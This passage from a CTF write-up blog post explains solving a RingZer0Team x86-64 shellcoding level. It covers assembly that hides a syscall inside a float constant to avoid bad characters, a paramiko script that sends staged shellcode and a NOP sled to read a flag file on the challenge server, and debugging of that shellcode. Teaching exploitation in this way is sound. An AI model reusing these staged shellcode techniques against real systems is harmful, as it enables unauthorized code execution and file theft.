</span><span class='line'><span class="n">add</span> <span class="n">al</span><span class="p">,</span> <span class="n">_syscall</span><span class="o">-</span><span class="n">_start</span> <span class="p">;</span> <span class="n">point</span> <span class="n">rax</span> <span class="n">to</span> <span class="n">encoded</span> <span class="n">instruction</span>
</span></code></pre></td></tr></table></div></figure>


<p>I didn&rsquo;t care anymore about using <code>rcx</code> as a counter and index. I needed to adjust the pointer to the right address, which contained an encoded dword. The decoding of this dword is handle by these instructions:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">fldz</span>                    <span class="p">;</span> <span class="n">setup</span> <span class="n">st0</span>
</span><span class='line'><span class="n">fsub</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>        <span class="p">;</span> <span class="n">subtract</span> <span class="n">encoded</span> <span class="n">instruction</span>
</span><span class='line'><span class="n">fistp</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>       <span class="p">;</span> <span class="n">store</span> <span class="n">them</span> <span class="n">again</span>
</span></code></pre></td></tr></table></div></figure>


<p>The dword that I chose to encode were actually these instructions:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bits</span> <span class="mi">64</span>
</span><span class='line'><span class="n">xchg</span> <span class="n">rax</span><span class="p">,</span><span class="n">rsi</span>
</span><span class='line'><span class="n">syscall</span>
</span></code></pre></td></tr></table></div></figure>


<p>These would assembled to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="err">$</span> <span class="n">xxd</span> <span class="n">small</span>
</span><span class='line'><span class="mo">0000000</span><span class="p">:</span> <span class="mi">4896</span> <span class="mi">0</span><span class="n">f05</span>
</span></code></pre></td></tr></table></div></figure>


<p>I then turned to python:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="err">$</span> <span class="n">python</span>
</span><span class='line'><span class="n">Python</span> <span class="mf">2.7</span><span class="o">.</span><span class="mi">3</span> <span class="p">(</span><span class="n">default</span><span class="p">,</span> <span class="n">Mar</span> <span class="mi">13</span> <span class="mi">2014</span><span class="p">,</span> <span class="mi">11</span><span class="p">:</span><span class="mo">03</span><span class="p">:</span><span class="mi">55</span><span class="p">)</span>
</span><span class='line'><span class="p">[</span><span class="n">GCC</span> <span class="mf">4.7</span><span class="o">.</span><span class="mi">2</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux2</span>
</span><span class='line'><span class="n">Type</span> <span class="s">&quot;help&quot;</span><span class="p">,</span> <span class="s">&quot;copyright&quot;</span><span class="p">,</span> <span class="s">&quot;credits&quot;</span> <span class="ow">or</span> <span class="s">&quot;license&quot;</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="o">.</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="mh">0x050f9648</span>
</span><span class='line'><span class="mi">84907592</span>
</span></code></pre></td></tr></table></div></figure>


<p>I was lucked out here. I tried many things, but this value, stored as a negative float, did <strong>not</strong> contain any bad chars!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">sbb</span> <span class="n">esi</span><span class="p">,</span> <span class="n">esi</span>            <span class="p">;</span> <span class="nb">set</span> <span class="n">rsi</span> <span class="n">to</span> <span class="n">zero</span>
</span><span class='line'><span class="n">xchg</span> <span class="n">esi</span><span class="p">,</span> <span class="n">edi</span>           <span class="p">;</span> <span class="n">used</span> <span class="k">for</span> <span class="n">edi</span> <span class="o">-&gt;</span> <span class="n">stdin</span>
</span><span class='line'><span class="n">sbb</span> <span class="n">esi</span><span class="p">,</span> <span class="n">esi</span>            <span class="p">;</span> <span class="nb">set</span> <span class="n">rsi</span> <span class="n">to</span> <span class="n">zero</span><span class="p">,</span> <span class="n">used</span> <span class="k">for</span> <span class="n">rax</span> <span class="o">-&gt;</span> <span class="n">read</span>
</span><span class='line'><span class="n">mov</span> <span class="n">dl</span><span class="p">,</span> <span class="mh">0xf0</span>            <span class="p">;</span> <span class="n">read</span> <span class="ow">in</span> <span class="mh">0xf0</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">hopefully</span> <span class="n">enough</span>
</span><span class='line'><span class="n">_syscall</span><span class="p">:</span>
</span><span class='line'><span class="n">dd</span> <span class="o">-</span><span class="mf">84907592.0</span>          <span class="p">;</span> <span class="n">this</span> <span class="ow">is</span> <span class="n">actually</span> <span class="n">xchg</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rsi</span><span class="p">;</span> <span class="n">syscall</span> <span class="n">but</span> <span class="n">encoded</span> <span class="k">as</span> <span class="n">a</span> <span class="nb">float</span><span class="err">!</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>sbb</code> instruction is just another way of saying <code>sub esi, esi</code>. The <code>sub</code> instruction contains a bad char. Operations on <code>rsi</code> and <code>rdi</code> contained bad chars, but using <code>esi</code> and <code>edi</code> still had the desired effect of zeroing out the registers.</p>

<p>Finally, just before the <code>syscall</code> would be executed, the registers look like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">rsi</span><span class="p">:</span> <span class="n">address</span> <span class="n">of</span> <span class="n">_syscall</span>
</span><span class='line'><span class="n">rdi</span><span class="p">:</span> <span class="n">zero</span> <span class="p">(</span><span class="n">stdin</span><span class="p">)</span>
</span><span class='line'><span class="n">rax</span><span class="p">:</span> <span class="n">zero</span> <span class="p">(</span><span class="n">syscall</span> <span class="n">read</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Upon executing the syscall, code execution will go into kernel space, reading from stdin <em>to</em> the address of _syscall, overwriting the instructions that come after it.</p>

<p>Which lead me to another problem: how do we send the shellcode? I couldn&rsquo;t send raw bytes over <code>ssh</code>. One option was to encode the shellcode again, using an alphanumeric carver. I decided to put that option on hold. I tried to port-forward the ssh connection so that I could use python and sockets to get the flag; didn&rsquo;t work. Instead, I had to turn to some paramiko black magic. Behold, <code>fullauto.py</code>!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">paramiko</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="n">ssh</span> <span class="o">=</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">SSHClient</span><span class="p">()</span>
</span><span class='line'><span class="c"># fix missing hostkey -&gt; https://stackoverflow.com/questions/10670217/paramiko-unknown-server</span>
</span><span class='line'><span class="n">ssh</span><span class="o">.</span><span class="n">set_missing_host_key_policy</span><span class="p">(</span><span class="n">paramiko</span><span class="o">.</span><span class="n">AutoAddPolicy</span><span class="p">())</span> 
</span><span class='line'><span class="n">ssh</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s">&#39;shellcode.ringzer0team.com&#39;</span><span class="p">,</span> <span class="n">username</span><span class="o">=</span><span class="s">&#39;level7&#39;</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s">&#39;FLAG-&lt;redacted&gt;&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">7771</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># this was the only thing that worked for me. opening a channel via a transport failed miserably.</span>
</span><span class='line'><span class="n">chan</span> <span class="o">=</span> <span class="n">ssh</span><span class="o">.</span><span class="n">invoke_shell</span><span class="p">()</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">chan</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># send stage0, which will attempt to read from stdin. mind the last \n!</span>
</span><span class='line'><span class="n">chan</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\\</span><span class="s">x04</span><span class="se">\\</span><span class="s">x10</span><span class="se">\\</span><span class="s">xd9</span><span class="se">\\</span><span class="s">xee</span><span class="se">\\</span><span class="s">xd8</span><span class="se">\\</span><span class="s">x20</span><span class="se">\\</span><span class="s">xdb</span><span class="se">\\</span><span class="s">x18</span><span class="se">\\</span><span class="s">x19</span><span class="se">\\</span><span class="s">xf6</span><span class="se">\\</span><span class="s">x87</span><span class="se">\\</span><span class="s">xf7</span><span class="se">\\</span><span class="s">x19</span><span class="se">\\</span><span class="s">xf6</span><span class="se">\\</span><span class="s">xb2</span><span class="se">\\</span><span class="s">xf0</span><span class="se">\\</span><span class="s">xc9</span><span class="se">\\</span><span class="s">xf2</span><span class="se">\\</span><span class="s">xa1</span><span class="se">\\</span><span class="s">xcc</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">chan</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># we&#39;ll need a small NOP sled to get us to the shellcode</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span> <span class="o">*</span> <span class="mi">20</span>
</span><span class='line'>
</span><span class='line'><span class="c"># read in the 31 byte shellcode, designed to open/read/write a file</span>
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;modified-shellcode3&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">data</span>
</span><span class='line'>  <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  
</span><span class='line'><span class="n">chan</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">chan</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;/flag/level7.flag</span><span class="se">\x00\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">chan</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># receive flag!</span>
</span><span class='line'><span class="k">print</span> <span class="n">chan</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Running this python script with the appropriate password to level 7 spat out, amongst others, <em>part</em> of the final flag!</p>

<p>Something funky was going on. The stage 2 was being read and executed, but the contents of the flag on the stack were being mangled.</p>

<p>I finally traced it to this part of the shellcode:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">lea</span> <span class="n">rsi</span><span class="p">,</span> <span class="p">[</span><span class="n">rsp</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="o">...</span>
</span><span class='line'>
</span><span class='line'><span class="n">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'><span class="n">push</span> <span class="n">rax</span>            <span class="p">;</span> <span class="n">the</span> <span class="n">push</span> <span class="n">seems</span> <span class="n">to</span> <span class="n">mangle</span> <span class="n">the</span> <span class="n">output</span> <span class="n">on</span> <span class="n">the</span> <span class="n">stack</span>
</span><span class='line'><span class="n">pop</span> <span class="n">rdi</span>             <span class="p">;</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">stdout</span>
</span><span class='line'>                    <span class="p">;</span> <span class="n">rsi</span> <span class="o">=</span> <span class="n">still</span> <span class="n">pointer</span> <span class="n">to</span> <span class="nb">buffer</span>
</span><span class='line'>                    <span class="p">;</span> <span class="n">rdx</span> <span class="o">=</span> <span class="n">still</span> <span class="mh">0x7f</span>
</span><span class='line'><span class="n">syscall</span>
</span><span class='line'><span class="n">ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>Substituting it for this seemed to do the trick:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">lea</span> <span class="n">rsi</span><span class="p">,</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">60</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="o">...</span>
</span><span class='line'>
</span><span class='line'><span class="n">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">rax</span>        <span class="p">;</span> <span class="n">number</span> <span class="n">of</span> <span class="nb">bytes</span> <span class="n">read</span><span class="p">;</span> <span class="n">output</span> <span class="n">exactly</span> <span class="n">the</span> <span class="n">contents</span> <span class="n">of</span> <span class="n">flag</span><span class="o">.</span> <span class="n">it</span><span class="s">&#39;s cleaner this way</span>
</span><span class='line'><span class="n">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'><span class="n">push</span> <span class="n">rax</span>            <span class="p">;</span> <span class="n">the</span> <span class="n">push</span> <span class="n">seems</span> <span class="n">to</span> <span class="n">mangle</span> <span class="n">the</span> <span class="n">output</span> <span class="n">on</span> <span class="n">the</span> <span class="n">stack</span>
</span><span class='line'><span class="n">pop</span> <span class="n">rdi</span>             <span class="p">;</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">stdout</span>
</span><span class='line'>                    <span class="p">;</span> <span class="n">rsi</span> <span class="o">=</span> <span class="n">still</span> <span class="n">pointer</span> <span class="n">to</span> <span class="nb">buffer</span>
</span><span class='line'>                    <span class="p">;</span> <span class="n">rdx</span> <span class="o">=</span> <span class="n">still</span> <span class="mh">0x7f</span>
</span><span class='line'><span class="n">syscall</span>
</span><span class='line'><span class="n">ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;m still puzzled why this originally mangled the output on the stack, where I had no problems with this shellcode before. If anyone has an idea, let me know in the comments :)</p>

<h2>Final words</h2>

<p>Phew, what a ride! These challenges were a lot of fun and taught me several interesting concepts about x86-64 shellcoding. Thank you <a href="http://ringzer0team.com/">RingZer0Team</a> for these awesome challenges!</p>

<p>This writeup was written in two evenings of rigorously hacking away at the keyboard (the challenges were solved over several days). Therefore, errors will probably exist. If you find any, or have any suggestion or useful remark, please feel free to leave them in the comments!</p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">barrebas</span></span>

      




<time class='entry-date' datetime='2015-02-09T21:49:17+01:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>9</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:49 pm</span></time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/64-bit/'>64-bit</a>, <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/shellcode/'>shellcode</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://barrebas.github.io/blog/2015/02/09/solving-the-x86-64-shellcoding-challenges-of-ringzer0ctf/" data-via="barrebas" data-counturl="http://barrebas.github.io/blog/2015/02/09/solving-the-x86-64-shellcoding-challenges-of-ringzer0ctf/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2015/02/01/semi-weekly-roundup-2015-number-3/" title="Previous Post: (Semi) Weekly Roundup 2015 #3">&laquo; (Semi) Weekly Roundup 2015 #3</a>
      
      
        <a class="basic-alignment right" href="/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution/" title="Next Post: Maximum Overkill Two - From Format String Vulnerability To Remote Code Execution">Maximum Overkill Two - From Format String Vulnerability To Remote Code Execution &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2015/03/30/0ctf-r0ops/">0ctf - R0ops</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/03/30/0ctf-login/">0ctf - Login</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/03/30/0ctf-flagen/">0ctf - Flagen</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/03/23/after-the-fact-bctf-zhong-guan-cun-writeup/">After the Fact - BCTF Zhong Guan Cun Writeup</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/03/18/bsides-vancouver-ctf-www/">BSides Vancouver CTF - WWW</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - barrebas -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'barrebas';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://barrebas.github.io/blog/2015/02/09/solving-the-x86-64-shellcoding-challenges-of-ringzer0ctf/';
        var disqus_url = 'http://barrebas.github.io/blog/2015/02/09/solving-the-x86-64-shellcoding-challenges-of-ringzer0ctf/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
